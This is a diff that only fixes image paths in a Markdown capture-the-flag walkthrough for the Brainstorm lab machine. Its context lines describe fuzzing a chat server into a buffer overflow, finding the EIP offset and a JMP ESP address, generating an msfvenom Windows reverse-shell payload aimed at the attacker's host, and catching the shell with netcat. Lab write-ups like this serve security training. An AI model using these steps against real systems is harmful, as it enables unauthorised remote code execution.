@@ -43,7 +43,7 @@ Just start the machine!
 
 #### Question 2
 
-![Brainstorm Task 1 Question 2](/assets/imgBrainstorm 1.png)
+![Brainstorm Task 1 Question 2](/assets/img/Brainstorm 1.png)
 
 There are several ways to answer this question, but one of the easiest is to use threader3000, as it will enumerate all TCP ports. This can be ran by running:
 
@@ -51,7 +51,7 @@ There are several ways to answer this question, but one of the easiest is to use
 
 and then entering the IP address of the vulnerable host when prompted.
 
-![Brainstorm threader3000](/assets/imgBrainstorm2.png)
+![Brainstorm threader3000](/assets/img/Brainstorm2.png)
 
 This will provide the answer to this question, which should be  3 ports, but for some reason the answer is **6**. I've reviewed other walkthroughs to confirm, and it appears that everyone has the same 3 ports appear.
 
@@ -61,11 +61,11 @@ This will provide the answer to this question, which should be  3 ports, but for
 
 Next, choose option 1 to run the suggested nmap scan. After a couple of minutes, you will see the following results:
 
-![Brainstorm Task 2 Question 1 nmap](/assets/imgBrainstorm3.png)
+![Brainstorm Task 2 Question 1 nmap](/assets/img/Brainstorm3.png)
 
 You will see that there is an FTP server, RDP (3389) and a service named abyss on 9999. Let's look at the ftp server first and see if anonymous FTP access is available.
 
-![Brainstorm Anonymous FTP](/assets/imgBrainstorm4.png)
+![Brainstorm Anonymous FTP](/assets/img/Brainstorm4.png)
 
 Let's run
 
@@ -97,23 +97,23 @@ Let's run
 
 to download both of these files to our Kali box. 
 
-![Brainstorm download FTP file](/assets/imgBrainstorm5.png)
+![Brainstorm download FTP file](/assets/img/Brainstorm5.png)
 
 Move these over to a Windows box for analysis with Immunity Debugger installed. In my case, since I was RDPed into both boxes, let's copy both of these files by selecting them, right clicking, and selecting Copy.
 
-![Brainstorm Copy Files Kali Box](/assets/imgBrainstorm6.png)
+![Brainstorm Copy Files Kali Box](/assets/img/Brainstorm6.png)
 
 Next, on the Windows machine, paste the files (this should work if you allow copy/paste over RDP).
 
-![Brainstorm Paste to Windows system](/assets/imgBrainstorm7.png)
+![Brainstorm Paste to Windows system](/assets/img/Brainstorm7.png)
 
 Next, start the chatserver program and open Immunity Debugger. Once started, we need to attach Immunity Debugger to chatserver. This is done by pressing **CTRL+F1** and selecting that chatserver application.
 
-![Brainstorm Immunity Debugger Attach chatserver](/assets/imgBrainstorm8.png)
+![Brainstorm Immunity Debugger Attach chatserver](/assets/img/Brainstorm8.png)
 
 Next, let's click on the red arrow to run Immunity Debugger.
 
-![Brainstorm run Immunity Debugger](/assets/imgBrainstorm9.png)
+![Brainstorm run Immunity Debugger](/assets/img/Brainstorm9.png)
 
 You should see the program running in the bottom right hand corner. Next, on our Kali box, let's connect to our Windows box with netcat.
 
@@ -121,7 +121,7 @@ This is done with:
 
 **`nc <windows ip> 9999`**
 
-![Brainstorm nc chat server](/assets/imgBrainstorm10.png)
+![Brainstorm nc chat server](/assets/img/Brainstorm10.png)
 
 Let's see if we can use a Python script to test the username section to see if it is vulnerable to a buffer overflow attack:
 
@@ -155,13 +155,13 @@ This script will attempt to send 200 "A"s and increase it by 200 each time until
 
 It appears that it crashed around 2,300 bytes:
 
-![Brainstorm buffer overflow](/assets/imgBrainstorm12.png)
+![Brainstorm buffer overflow](/assets/img/Brainstorm12.png)
 
 Back in Immunity Debugger, you can see that the EIP and ESP have been overwritten with 41414141, which is the hex equivalent of AAAA. Let's now use Metasploit's pattern create utility to help us figure out exactly where this is crashing. Let's run the following command:
 
 **`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2300`**
 
-![Brainstorm pattern_create.rb](/assets/imgBrainstorm14.png)
+![Brainstorm pattern_create.rb](/assets/img/Brainstorm14.png)
 
 Next, let's modify our script above to look like the following:
 
@@ -183,7 +183,7 @@ s.close()
 
 Next, restart the chatserver application, Immunity Debugger, and attach Immunity Debugger to chatserver and run this new script after. This should crash chatserver immediately. Let's make note of the value listed under EIP in Immunity Debugger.
 
-![Brainstorm EIP Value](/assets/imgBrainstorm15.png)
+![Brainstorm EIP Value](/assets/img/Brainstorm15.png)
 
 Next, let's use Metasploit's pattern offset tool to find the exact match. This would be done with:
 
@@ -191,7 +191,7 @@ Next, let's use Metasploit's pattern offset tool to find the exact match. This w
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2300 -q 31704330
 ```
 
-![Brainstorm offset](/assets/imgBrainstorm16.png)
+![Brainstorm offset](/assets/img/Brainstorm16.png)
 
 This will provide the exact offset needed, which is 2012, and the answer to Question 2 (even though an answer is not required).
 
@@ -205,7 +205,7 @@ Once done, run
 
  in the bar at the bottom of Immunity Debugger.
 
-![Brainstorm Mona Modules](/assets/imgBrainstorm17.png)
+![Brainstorm Mona Modules](/assets/img/Brainstorm17.png)
 
 Next, let's run:
 
@@ -213,7 +213,7 @@ Next, let's run:
 
 in the bottom toolbar of Immunity Debugger. This is searching for the hex value of the JMP ESP (\xff\xe4) in the essfunc.dll file. This will allow us to jump to the ESP and execute our payload.
 
-![Brainstorm search for JMP ESP](/assets/imgBrainstorm18.png)
+![Brainstorm search for JMP ESP](/assets/img/Brainstorm18.png)
 
 After running this, make note of the first memory address highlighted above (625014df). This will be utilized for our exploit. Since this is a 32 bit application, we will need to use little endian when converting this to hex for our script. This would end up with \xdf\x14\x50\x62 inserted into our script. Next, let's make the following updates to our script:
 
@@ -234,19 +234,19 @@ s.close()
 
 This script will send 2007 A's, which will get us to our offset for the buffer overflow, it will then send the value for the JMP ESP value. Let's save this script and restart chatserver, restart Immunity Debugger, attach chatserver, and click on run in Immunity Debugger. Next, click on the last icon before he letters in the Immunity Debugger toolbar.
 
-![Brainstorm Immunity Toolbar](/assets/imgBrainstorm19.png)
+![Brainstorm Immunity Toolbar](/assets/img/Brainstorm19.png)
 
 Next enter the memory address (625014df) uncovered above.
 
-![Brainstorm jump to 62501df](/assets/imgBrainstorm20.png)
+![Brainstorm jump to 62501df](/assets/img/Brainstorm20.png)
 
 Next, press **F2** to set a breakpoint here and ensure that running is showing in the lower right hand corner.
 
-![Brainstorm Immunity Debugger Breakpoint](/assets/imgBrainstorm21.png)
+![Brainstorm Immunity Debugger Breakpoint](/assets/img/Brainstorm21.png)
 
 Once this is set, run the script from our Kali box. Next, in Immunity, Debugger, you should see the JMP ESP value uncovered previously listed as the EIP value as shown below.
 
-![Brainstorm confirm JMP ESP Value](/assets/imgBrainstorm22.png)
+![Brainstorm confirm JMP ESP Value](/assets/img/Brainstorm22.png)
 
 #### Question 4
 
@@ -258,7 +258,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Kali IP Address> LPORT=<Port of you
 
 This will create an x86 reverse TCP shell for Windows in Python code. You should see output similar to that shown below:
 
-![Brainstorm shellcode](/assets/imgBrainstorm23.png)
+![Brainstorm shellcode](/assets/img/Brainstorm23.png)
 
 Copy and paste the code above into your python script. Your new script should look like the following:
 
@@ -316,11 +316,11 @@ Next, let's start a netcat listener with
 
 on our Kali box.
 
-![Brainstorm netcat](/assets/imgBrainstorm24.png)
+![Brainstorm netcat](/assets/img/Brainstorm24.png)
 
 Next, run the script and we should catch a shell on the netcat listener.
 
-![Brainstorm shell on victim](/assets/imgBrainstorm25.png)
+![Brainstorm shell on victim](/assets/img/Brainstorm25.png)
 
 #### Question 5
 
@@ -344,7 +344,7 @@ and run
 
 one more time, the root.txt file is here.
 
-![Brainstorm enumerate user directory](/assets/imgBrainstorm26.png)
+![Brainstorm enumerate user directory](/assets/img/Brainstorm26.png)
 
 Next, run:
 
@@ -352,6 +352,6 @@ Next, run:
 
 to get the root hash for this box!
 
-![Brainstorm root](/assets/imgBrainstorm27.png)
+![Brainstorm root](/assets/img/Brainstorm27.png)
 
 </details>
